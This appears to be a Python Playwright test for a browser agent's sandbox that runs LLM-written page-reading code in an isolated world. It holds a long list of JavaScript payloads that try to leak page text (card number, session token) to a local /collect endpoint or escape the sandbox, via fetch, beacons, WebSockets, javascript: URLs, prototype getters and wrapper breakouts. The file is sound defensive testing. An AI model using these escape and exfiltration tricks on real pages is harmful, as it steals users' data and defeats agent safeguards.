"""Real Chromium: a Loop read can't send anything, navigate or act later (W1; the exploits of #64 among them), and an
ordinary read still works. It does what Tab.sealedRead does over CDP: a new isolated world, every request of the tab
failed while the read runs, READ_SEAL and the read's code (src/loop/read.ts), the address checked after. A local server
counts every request to /collect: none may arrive, during the read or after it. No paid calls.
Usage: python test/check_read_sandbox.py [REPO]"""
import asyncio, itertools, json, sys, threading
WORLDS = itertools.count(1)
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
from strip_types import js_source
from playwright.async_api import async_playwright

R = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parents[1]
PAGE = """<!doctype html><title>Orders</title><style>main { color: black }</style>
<main><h1>Orders</h1><p id="secret">Card ending 4242, session token abc123</p>
<a id="away" href="/collect?link">Details</a>
<form id="f" action="/collect?form" method="post"><input id="q" name="q" value="typed by the user"></form>
<iframe id="kid" name="k" src="/kid"></iframe><canvas id="wheel" width="4" height="4"></canvas></main>
<script>window.pageSecret = () => "from the page's own code"; window.pageData = {total: 42};
// the page's own: a timer chain and an animation loop that must keep running across reads, and a hash handler that
// sends the hash on (as an analytics script would)
{ const c = document.getElementById('wheel').getContext('2d'); c.fillStyle = 'rgb(0,128,0)'; c.fillRect(0, 0, 4, 4); }
window.ticks = 0; (function tick() { ticks++; setTimeout(tick, 20) })();
window.frames_ = 0; (function f() { frames_++; requestAnimationFrame(f) })();
addEventListener('hashchange', () => fetch('/collect?hash=' + location.hash.slice(1)));
</script>"""
hits = []


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self): self.answer()
    def do_POST(self): self.answer()

    def answer(self):
        if self.path.startswith("/collect"):
            hits.append(f"{self.command} {self.path}")
        body = PAGE if self.path == "/" else "<p>child frame</p>" if self.path == "/kid" else "ok"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body.encode())


# Each read: the code the LLM might be steered into writing, and whether it may still give a value (an ordinary read)
EXPLOITS = {
    "fetch.call POST (#64)": "fetch.call(window, '/collect?fetch', {method: 'POST', body: document.body.innerText})",
    "window['location'] (#64)": "window['location'] = '/collect?loc=' + encodeURIComponent(document.body.innerText)",
    "location.href": "location.href = '/collect?href'",
    "new Image": "new Image().src = '/collect?image'",
    "img by createElement": "const i = document.createElement('img'); i['src'] = '/collect?img'; return 1",
    "insertAdjacentHTML": "document.body['insertAdjacent' + 'HTML']('beforeend', '<img src=/collect?html>')",
    "innerHTML": "document.querySelector('main')['inner' + 'HTML'] += '<img src=/collect?inner>'",
    "form submit": "HTMLFormElement.prototype['sub' + 'mit'].call(document.getElementById('f'))",
    "link click": "document.getElementById('away')['cli' + 'ck']()",
    "sendBeacon": "navigator['send' + 'Beacon']('/collect?beacon', 'x')",
    "XMLHttpRequest": "const x = new globalThis['XMLHttp' + 'Request'](); x.open('GET', '/collect?xhr'); x.send(); return 1",
    "timer, later": "globalThis['set' + 'Timeout'](() => fetch('/collect?timer'), 300); return 1",
    "listener, later": "document['addEvent' + 'Listener']('mousemove', () => fetch('/collect?listener')); return 1",
    "style url": "document.body.style['background' + 'Image'] = 'url(/collect?css)'",
    "stylesheet rule url": "document.styleSheets[0].cssRules[0].style.background = 'url(/collect?rule)'",
    "typed style url": "document.body.attributeStyleMap.set('background-image', 'url(/collect?typed)')",
    "setAttribute src": "document.getElementById('kid')['setAttri' + 'bute']('src', '/collect?frame')",
    "child frame window": "document.getElementById('kid').contentWindow.fetch('/collect?kid')",
    "page's own function": "window.pageSecret()",
    "window.open": "window['op' + 'en']('/collect?open')",
    "dynamic import": "import('/collect?import.js')",
    "pushState": "history['push' + 'State']({}, '', '/collect?push')",
    # the review's cases (#75): a javascript: address runs in the page's own world; code left running sets location later
    "javascript: address": "window['loc' + 'ation'] = 'javascript:void(fetch(\"/collect?js\"))'",
    "javascript: by Reflect.set": "Reflect.set(location, 'href', 'javascript:void(fetch(\"/collect?js2\"))')",
    "link host": "const a = document.getElementById('away'); a.host = 'localhost:' + location.port; return 1",
    "link search": "document.getElementById('away').search = '?d=' + encodeURIComponent(document.body.innerText)",
    "input defaultValue": "document.getElementById('q').defaultValue = 'x'",
    "crypto, later": "(async () => { await crypto.subtle.digest('SHA-256', new Uint8Array(1)); location.href = '/collect?c' })(); return 1",
    "location later, off-site": "const t = performance.now(); (async () => { for (;;) { await import('data:text/javascript,export default 1'); "
                                "if (performance.now() - t > 1200) break } Reflect.set(location, 'href', OTHER + '/collect?late') })(); return 1",
    "hash": "Reflect.set(location, 'hash', encodeURIComponent(document.body.innerText))",
    "blob document": "location = URL.createObjectURL(new Blob(['<img src=/collect?blob>'], {type: 'text/html'}))",
    "javascript: that plants a timer": "window['loc' + 'ation'] = 'javascript:void(setTimeout(() => fetch(\"/collect?planted\"), 600))'",
    # code a javascript: address would run in the page's own world, over channels Fetch never sees, or left for later
    "javascript: WebSocket": "location = 'javascript:void(new WebSocket(\"ws://\" + location.host + \"/collect?ws\"))'",
    "javascript: storage handoff": "location = 'javascript:void(localStorage.handoff = document.body.innerText)'",
    # ways back to the real window, document or Location: the read's names stand for stand-ins that lead to none
    "document.location": "document.location = 'javascript:void(fetch(\"/collect?dl\"))'",
    "defaultView": "document.defaultView.location = 'javascript:void(fetch(\"/collect?dv\"))'",
    "ownerDocument": "document.body.ownerDocument.location.href = 'javascript:void(fetch(\"/collect?od\"))'",
    "html.parentNode": "document.documentElement.parentNode.location.href = 'javascript:void(fetch(\"/collect?pn\"))'",
    "getRootNode": "document.body.getRootNode().location.href = 'javascript:void(fetch(\"/collect?rn\"))'",
    "XPath to the document": "document.evaluate('/', document.body, null, 9, null).singleNodeValue.location.href = 'javascript:void(fetch(\"/collect?xp\"))'",
    "this": "(function () { return this })().location = 'javascript:void(fetch(\"/collect?this\"))'",
    "a descriptor": "Object.getOwnPropertyDescriptor(document, 'location').set.call(document, 'javascript:void(fetch(\"/collect?desc\"))')",
    "window, by any name": "self.frames.top.location = 'javascript:void(fetch(\"/collect?top\"))'",
    # the fourth review's: the code closing the function it runs in, a walker's filter, a stack trace's `this`, a child
    # frame's window by index
    "wrapper breakout": "return 1 }).call(); location = 'javascript:void(fetch(\"/collect?break\"))'; (async function () {",
    "node filter": "let d; document.createNodeIterator(document, 0xFFFFFFFF, (n) => { if (!d) d = n; return 1 }).nextNode(); d.location.href = 'javascript:void(fetch(\"/collect?nf\"))'",
    "stack trace this": "Error.prepareStackTrace = (e, cs) => cs; let cs; try { fetch('/x') } catch (e) { cs = e.stack } const w = cs.map((c) => c.getThis()).find((x) => x && x.location); w.location = 'javascript:void(fetch(\"/collect?st\"))'",
    "child frame by index": "window[0].parent.location = 'javascript:void(fetch(\"/collect?kid\"))'",
    "child frame descriptor": "Object.getOwnPropertyDescriptor(window, 0).value.top.location = 'javascript:void(fetch(\"/collect?kid3\"))'",
    "frames by index": "frames[0].fetch('/collect?kid2')",
    # the seventh review's: the scope is the host's; a read that reaches for its compiler or runner finds nothing
    "scope compile": "const c = window['__drex' + 'Scope'] ?? globalThis['__drex' + 'Scope']; "
                     "const m = await c.compile(\"return import('data:text/javascript,export default globalThis')\")(); "
                     "m.default.location = 'javascript:void(fetch(\"/collect?cm\"))'",
    "style write on a hidden element": "document.body.style.backgroundImage = 'url(/collect?sty)'",
    # the seventh review's: a getter or method added to a prototype of the document gets the real document as `this`
    "prototype getter this": "let c; Object.defineProperty(Document.prototype, '__capture', { configurable: true, get() { c = this; return 0 } }); "
                             "void document.__capture; c.location = 'javascript:void(fetch(\"/collect?pg\"))'",
    "object prototype method this": "let c; Object.prototype.__cap = function () { c = this }; document.__cap(); "
                                    "c.location = 'javascript:void(fetch(\"/collect?pm\"))'",
    "document set prototype": "let c; Object.setPrototypeOf(document, { get __cap() { c = this; return 0 } }); void document.__cap; "
                              "c.location = 'javascript:void(fetch(\"/collect?sp\"))'",
    # the fifth review's: a frame reached by its name (<iframe name=k> makes `k` a global), whose own world is unsealed
    "named frame's top": "k.top.location = 'javascript:void(fetch(\"/collect?nk\"))'",
    "named frame's WebSocket": "Reflect.construct(k.WebSocket, ['ws://' + document.location.host + '/collect?nkws'])",
    "named frame's timer": "k.setTimeout(() => k.fetch('/collect?nkt'), 300)",
    # the sixth review's: the named frame through the window's prototype chain (WindowProperties)
    "named frame via Window.prototype": "Object.getPrototypeOf(Window.prototype).k.top.location = 'javascript:void(fetch(\"/collect?wp\"))'",
    "named frame via the window's prototype": "Object.getPrototypeOf(Object.getPrototypeOf(window)).k.top.location = 'javascript:void(fetch(\"/collect?wp2\"))'",
    "named frame via constructor": "Object.getPrototypeOf(window.constructor.prototype).k.top.location = 'javascript:void(fetch(\"/collect?wp3\"))'",
        "inline style write": "document.body.style.display = 'none'; return 1",
    "timer after the read": "(async () => { await Promise.resolve(); })(); setTimeout(() => {}, 1); const t = setTimeout; Promise.resolve().then(() => 0); return typeof t",
        "timer callback's this": "await new Promise((r) => setTimeout(function () { Reflect.set(this, 'location', 'javascript:void(fetch(\"/collect?tt\"))'); r(1) }, 0)); return 1",
        "getter on the canvas prototype": "Object.defineProperty(CanvasRenderingContext2D.prototype, '__raw', { get() { return this } }); document.getElementById('wheel').getContext('2d').__raw.fillRect(0, 0, 1, 1); return 1",
        "getter on the style prototype": "Object.defineProperty(CSSStyleDeclaration.prototype, '__raw', { get() { return this } }); document.body.style.__raw.display = 'none'; return 1",
        "new prototype on the canvas": "const c = document.getElementById('wheel').getContext('2d'); Object.setPrototypeOf(c, { __proto__: Object.getPrototypeOf(c), get raw() { return this } }); c.raw.fillRect(0, 0, 1, 1); return 1",
        "new prototype on the style": "const s = document.body.style; Object.setPrototypeOf(s, { __proto__: Object.getPrototypeOf(s), get raw() { return this } }); s.raw.display = 'none'; return 1",
        "canvas drawing": "document.getElementById('wheel').getContext('2d').fillRect(0, 0, 1, 1); return 1",
        "location through window's descriptor": "Object.getOwnPropertyDescriptor(window, 'location').get.call(undefined).href = 'javascript:void(fetch(\"/collect?wd\"))'",
    "location through document's descriptor": "Object.getOwnPropertyDescriptor(document, 'location').get.call(undefined).href = 'javascript:void(fetch(\"/collect?dd\"))'",
        "webkit animation frame, later": "webkitRequestAnimationFrame(() => fetch('/collect?wraf')); return 1",
        "javascript: later": "const t = performance.now(); (async () => { for (;;) { await import('data:text/javascript,export default 1'); "
                         "if (performance.now() - t > 1200) break } location = 'javascript:void(fetch(\"/collect?jslate\"))' })(); return 1",
}
ORDINARY = {
    "text": ("document.getElementById('secret').innerText", '"Card ending 4242, session token abc123"'),
    "rows": ("[...document.querySelectorAll('main > *')].map((e) => e.tagName).join(',')", '"H1,P,A,FORM,IFRAME,CANVAS"'),
    "an input's value": ("document.getElementById('q').value", '"typed by the user"'),
    "a link's address": ("({href: document.getElementById('away').href})", '{"href":"http://127.0.0.1:PORT/collect?link"}'),
    "computed style": ("getComputedStyle(document.body).display", '"block"'),
    "a box": ("document.querySelector('h1').getBoundingClientRect().height > 0", "true"),
    "XPath over the document": ("document.evaluate('//h1', document, null, 7, null).snapshotItem(0).textContent", '"Orders"'),
    "location, read": ("location.pathname + location.search", '"/"'),
        "an inline style": ("getComputedStyle(document.body).display === 'block' && document.body.style.display", '""'),
    "window.setTimeout inside the read": ("await new Promise((r) => window.setTimeout(r, 20)); return 1", "1"),
        "a wait inside the read": ("await new Promise((r) => setTimeout(r, 50)); return document.title", '"Orders"'),
        "a timer callback gets its extra arguments": ("return await new Promise((r) => setTimeout(r, 20, document.title))", '"Orders"'),
        "a timer callback gets the stand-in window as an argument": ("return await new Promise((r) => setTimeout((w) => r(w === window), 20, window))", "true"),
        "a timer callback gets the stand-in document as an argument": ("return await new Promise((r) => setInterval((d) => r(d === document), 20, document))", "true"),
        "a timer callback's this is the stand-in": ("await new Promise((r) => setTimeout(function () { r(this === window) }, 0))", "true"),
        "a canvas pixel": ("[...document.getElementById('wheel').getContext('2d').getImageData(1, 1, 1, 1).data].join(',')", '"0,128,0,255"'),
        "the window's own names": ("Object.keys(window).includes('NaN') || Object.getOwnPropertyNames(window).length > 50", "true"),
    "the document's own names": ("JSON.stringify(Object.keys(document).length >= 0)", '"true"'),
    "a spread of window": ("typeof ({...window}).document", '"object"'),
        "an await": ("const n = await Promise.resolve(2); return document.title + n", '"Orders2"'),
}


async def main():
    read = js_source(R, "loop/read")
    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{port}/"
    failures = []
    async with async_playwright() as p:
        b = await p.chromium.launch()
        page = await b.new_page()
        # READ_SEAL and readExpression, from the module itself
        await page.goto(base)
        other = f"http://localhost:{port}"
        for k in EXPLOITS: EXPLOITS[k] = EXPLOITS[k].replace("OTHER", json.dumps(other))
        codes = list(EXPLOITS.values()) + [js for js, _ in ORDINARY.values()] + ["document.title"]
        helper = await page.evaluate("""async ([src, codes]) => {
          const url = URL.createObjectURL(new Blob([src], {type: 'text/javascript'}));
          const m = await import(url);
          const wrapped = Object.fromEntries(codes.map((js) =>
            [js, {expression: m.readExpression(js, 2000, 'expression'), body: m.readExpression(js, 2000, 'body'),
                  refused: m.readProblem(js)}]));
          return {seal: m.READ_SEAL, wrapped};
        }""", [read, codes])
        seal = helper["seal"]
        cdp = await page.context.new_cdp_session(page)
        state = {"sealed": None, "guard": False, "guarded": [], "javascript": []}
        here = base.rstrip("/")

        async def paused(e):
            """Tab.onEvent: fail all while sealed; after the first read, the guard fails a page request no action started
            to another origin (LoopAgent.allowsNavigation with no action under way)."""
            url = e["request"]["url"]
            if state["sealed"] is not None:
                state["sealed"].append(url)
                if e.get("resourceType") == "Document": nav["failed"] = True
                await cdp.send("Fetch.failRequest", {"requestId": e["requestId"], "errorReason": "BlockedByClient"})
            elif state["guard"] and e.get("resourceType") == "Document" and not url.startswith(here):
                state["guarded"].append(url)
                await cdp.send("Fetch.failRequest", {"requestId": e["requestId"], "errorReason": "BlockedByClient"})
            else:
                await cdp.send("Fetch.continueRequest", {"requestId": e["requestId"]})
        def scheduled(e):
            if not e["url"].startswith("javascript:"): return
            if state["sealed"] is not None: nav["scripted"] = True
            else: state["javascript"].append(e["url"])
        cdp.on("Page.frameScheduledNavigation", scheduled)
        cdp.on("Fetch.requestPaused", lambda e: asyncio.ensure_future(paused(e)))
        nav = {"asked": False, "failed": False, "scripted": False}
        cdp.on("Page.frameRequestedNavigation", lambda e: nav.update(asked=state["sealed"] is not None or nav["asked"]))
        await cdp.send("Page.enable")

        async def sealed_read(js, gate=True):
            """What Tab.sealedRead and LoopAgent.runRead do: (value, blocked, moved)."""
            tree = (await cdp.send("Page.getFrameTree"))["frameTree"]["frame"]
            world = await cdp.send("Page.createIsolatedWorld", {"frameId": tree["id"], "worldName": f"drex-read-{next(WORLDS)}"})
            state["sealed"] = []
            state["guard"] = True  # guardNavigations, before the first read
            nav.update(asked=False, failed=False, scripted=False)
            await cdp.send("Fetch.enable", {"patterns": [{"urlPattern": "*"}]})
            value = None
            moved = None
            if gate and helper["wrapped"][js]["refused"]:  # LoopAgent.readPage: refused code runs nothing
                blocked, state["sealed"] = state["sealed"], None
                await cdp.send("Fetch.enable", {"patterns": [{"urlPattern": "*", "resourceType": "Document"}]})
                return "refused: " + helper["wrapped"][js]["refused"], blocked, None
            try:
                for form in ("expression", "body"):
                    expr = helper["wrapped"][js][form]
                    try:  # Runtime.evaluate's timeout covers the script, not an await: LoopAgent races the read against READ_TIMEOUT_MS
                        r = await asyncio.wait_for(cdp.send("Runtime.evaluate", {"expression": seal + "\n" + expr,
                                                                                  "contextId": world["executionContextId"],
                                                                                  "returnByValue": True, "awaitPromise": True,
                                                                                  "timeout": 5000}), 6)
                    except asyncio.TimeoutError:
                        value = "timed out"
                        break
                    d = r.get("exceptionDetails")
                    if d and d.get("text") == "Uncaught" and d.get("exception", {}).get("className") == "SyntaxError":
                        continue
                    value = json.dumps(d["exception"].get("description", d["text"]))[:120] if d else r["result"].get("value")
                    break
                await asyncio.sleep(0.15)  # SEAL_GRACE_MS
                now = (await cdp.send("Page.getFrameTree"))["frameTree"]["frame"]
                addr = lambda f: f["url"] + f.get("urlFragment", "")
                if nav["asked"] or nav["scripted"] or now["id"] != tree["id"] or addr(now) != addr(tree):
                    moved = "javascript:" if nav["scripted"] else (now.get("unreachableUrl") or addr(now))
                    await cdp.send("Page.navigate", {"url": "about:blank"})  # ends what the read left running
                    for _ in range(40):
                        if (await cdp.send("Page.getFrameTree"))["frameTree"]["frame"]["url"] == "about:blank": break
                        await asyncio.sleep(0.05)
            finally:
                blocked, state["sealed"] = state["sealed"], None
                await cdp.send("Fetch.enable", {"patterns": [{"urlPattern": "*", "resourceType": "Document"}]})
            if moved:
                await page.goto(addr(tree))
            return value, blocked, moved

        # each exploit twice: with the sandbox alone (the text check passed over, as code that gets past it would), then
        # as the agent runs it. Alone, only RESIDUAL may get through: it needs import, which the text check refuses (the
        # keyword can't be escaped, and eval and the Function constructors are sealed)
        RESIDUAL = {"javascript: later"}
        for gate, (name, js) in [(g, item) for g in (False, True) for item in EXPLOITS.items()]:
            name = name + ("" if gate else ", sandbox alone")
            await page.goto(base)
            before = len(hits)
            value, blocked, moved = await sealed_read(js, gate)
            await page.mouse.move(10, 10)
            await page.mouse.move(200, 200)
            await page.wait_for_timeout(2500)  # what a read set up for later has had its chance
            sent = hits[before:]
            back = page.url == base
            # a navigation the guard failed leaves the tab on Chrome's error page: nothing was sent, and the LLM is told
            handoff = await page.evaluate("(() => { try { return localStorage.getItem('handoff') } catch { return null } })()")
            ok = not sent and not handoff and (back or bool(state["guarded"])) and "from the page's own code" not in str(value)
            guarded, ran = state["guarded"][:], state["javascript"][:]
            state["guarded"].clear(); state["javascript"].clear()
            print(f"{'ok  ' if ok else 'FAIL'} {name}: sent {sent or 'nothing'}, blocked {len(blocked)}, "
                  f"guarded {guarded or 'none'}, javascript: later {ran or 'none'}, moved {moved or 'no'}, back {back}, "
                  f"value {str(value)[:70]}")
            if not ok and not gate and name.removesuffix(", sandbox alone") in RESIDUAL:
                print("     (the residual: refused by the text check below)")
                ok = True
            if not ok: failures.append(name)
        # the guard itself: once a read has run, a navigation to another site that no action started is failed, whoever
        # started it (code a read left running would do just this); one on the run's own site goes
        for name, target, want_sent in (("guard, off-site", other + "/collect?guard", False),
                                        ("guard, own site", base + "collect?own", True)):
            await page.goto(base)
            before = len(hits)
            await page.evaluate("(u) => { location.href = u }", target)
            await page.wait_for_timeout(1500)
            sent, guarded = hits[before:], state["guarded"][:]
            state["guarded"].clear()
            ok = bool(sent) == want_sent and (want_sent or bool(guarded))
            print(f"{'ok  ' if ok else 'FAIL'} {name}: sent {sent or 'nothing'}, guarded {guarded or 'none'}, tab {page.url[:60]}")
            if not ok: failures.append(name)
        await page.goto(base)
        for name, (js, want) in ORDINARY.items():
            value, blocked, moved = await sealed_read(js)
            want = want.replace("PORT", str(port))
            ok = value == want and not moved
            print(f"{'ok  ' if ok else 'FAIL'} ordinary read, {name}: {value}")
            if not ok: failures.append(name)
        # two reads: the first plants a hook on a built-in the wrapper uses, the second must not call it with the real window
        await page.goto(base)
        before = len(hits)
        plant = ("Object.getOwnPropertyDescriptor = function (o, k) { try { o.location = "
                 "'javascript:void(fetch(\"/collect?plant\"))' } catch (e) {} return undefined }; return 1")
        helper["wrapped"].setdefault(plant, None)
        if helper["wrapped"][plant] is None:
            helper["wrapped"][plant] = await page.evaluate("""async ([src, js]) => {
              const m = await import(URL.createObjectURL(new Blob([src], {type: 'text/javascript'})));
              return {expression: m.readExpression(js, 2000, 'expression'), body: m.readExpression(js, 2000, 'body'), refused: null};
            }""", [read, plant])
        first, _, _ = await sealed_read(plant, False)
        second, _, _ = await sealed_read("document.title")
        await page.wait_for_timeout(1500)
        sent = hits[before:]
        ok = not sent and second == '"Orders"'
        print(f"{'ok  ' if ok else 'FAIL'} a hook planted by one read, another read after: sent {sent or 'nothing'}, "
              f"first {str(first)[:60]}, second {second}")
        if not ok: failures.append("two-read plant")
        # the page's own timers and animation frames keep running across reads
        t0 = await page.evaluate("[ticks, frames_]")
        await sealed_read("document.title")
        await page.wait_for_timeout(500)
        t1 = await page.evaluate("[ticks, frames_]")
        ok = t1[0] > t0[0] + 5 and t1[1] > t0[1] + 5
        print(f"{'ok  ' if ok else 'FAIL'} the page's timers across a read: ticks {t0[0]} -> {t1[0]}, frames {t0[1]} -> {t1[1]}")
        if not ok: failures.append("page timers")
        # the page's own requests go on once the read is over, and its own code is untouched
        own = await page.evaluate("fetch('/ok').then((r) => r.text())")
        main = await page.evaluate("[typeof setTimeout, typeof fetch, window.pageSecret()]")
        ok = own == "ok" and main == ["function", "function", "from the page's own code"]
        print(f"{'ok  ' if ok else 'FAIL'} the page after reads: its fetch gives {own!r}, its world {main}")
        if not ok: failures.append("page after reads")
        await b.close()
    server.shutdown()
    print(f"\n{2 * len(EXPLOITS) + len(ORDINARY) + 5 - len(failures)} passed, {len(failures)} failed {failures or ''}")
    sys.exit(1 if failures else 0)

asyncio.run(main())
